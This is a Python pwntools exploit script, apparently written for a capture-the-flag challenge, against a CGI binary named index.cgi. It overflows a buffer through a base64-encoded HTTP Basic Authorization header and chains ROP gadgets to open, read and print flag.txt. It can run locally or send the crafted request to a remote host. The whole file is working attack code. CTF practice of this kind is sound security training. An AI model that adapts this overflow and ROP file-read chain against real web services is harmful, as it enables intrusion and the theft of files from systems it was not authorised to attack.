#!/usr/bin/env python3

from pwn import *

import base64

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('index.cgi', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main
        # inside throw
        b*0x406940 
        # strlen in decode func
        b*0x0000000000404d5a

        # cmp basic
        b*0x4050a3
        c
        ''')


# host = "challs.nusgreyhats.org"
host = '127.0.0.1'
port = 32367

flag = b'admin:grey{fake_flag}'

pop_rdi = 0x0000000000403265
pop_rsi = 0x0000000000405f45
pop_rdx_rbx = 0x484767
b64 = flat(
    b'admin:',
    b'a'*(0x110-6),
    0x4e0440, # rbp
    0x4086e0, # rip
    b'b'*0x38,

    pop_rdi,
    0x48f131, # flag.txt string
    pop_rsi, 0,
    exe.sym.open,

    pop_rdi,
    3,
    pop_rsi,
    0x4c3280,
    pop_rdx_rbx, 0x30, 0,
    exe.sym.read,

    pop_rdi, 1,
    exe.sym.write

)

load = b'Basic ' + base64.b64encode(b64) + b'@AAA'

auth = base64.b64encode(flag).decode()


env = {
    "REQUEST_METHOD": "GET",
    "HTTP_AUTHORIZATION": load
}

# gdbscript = f'''

#     set environment REQUEST_METHOD GET
#     set environment HTTP_AUTHORIZATION Basic {load}

#     b*main
#     # inside throw
#     b*0x406940 
#     # strlen in decode func
#     b*0x0000000000404d5a

#     # cmp basic
#     b*0x4050a3
#     c
# '''

if args.REMOTE:
    p = remote(host, port)
    req = flat(
    f"GET / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    f"Authorization: Basic {load}\r\n"
    f"Connection: close\r\n"
    f"\r\n")

    input()
    p.send(req)
    
else:

    p = process([exe.path], env=env)
    # GDB()
    # print(repr(env["HTTP_AUTHORIZATION"]))
p.interactive()
